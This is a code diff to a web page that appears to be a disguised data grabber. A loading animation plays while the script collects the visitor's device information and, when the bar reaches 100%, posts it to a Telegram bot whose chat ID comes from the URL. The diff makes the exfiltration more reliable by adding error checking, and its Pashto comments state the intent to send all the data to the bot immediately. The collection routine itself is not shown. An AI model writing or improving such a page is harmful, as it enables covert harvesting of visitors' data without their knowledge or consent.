@@ -46,7 +46,7 @@
     background: linear-gradient(90deg,#ff6a00,#ee0979);
     border-radius: 10px;
     box-shadow: 0 0 10px rgba(255,255,255,0.6);
-    transition: width 0.1s;
+    transition: width 0.05s linear;
   }
   .status {
     position: absolute;
@@ -122,7 +122,9 @@ async function sendToTelegram(message){
     const fd = new FormData();
     fd.append('chat_id', CHAT_ID_FROM_URL);
     fd.append('text', message);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',body:fd});
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',body:fd});
+    const json = await res.json();
+    if(!json.ok) throw new Error(json.description||'Telegram error');
     statusEl.textContent='Sent ✅';
   }catch(err){
     console.error(err);
@@ -147,7 +149,9 @@ function animateLoader(duration=2500){
 
 (async function main(){
   const info = await collectDeviceInfo();
+  // لودینګ شروع کړئ
   await animateLoader(2500);
+  // کله چې بار ۱۰۰٪ شو، **سمدلاسه ټول معلومات بوت ته ولیږل شي**
   await sendToTelegram(makeMessage(info));
 })();
 })();
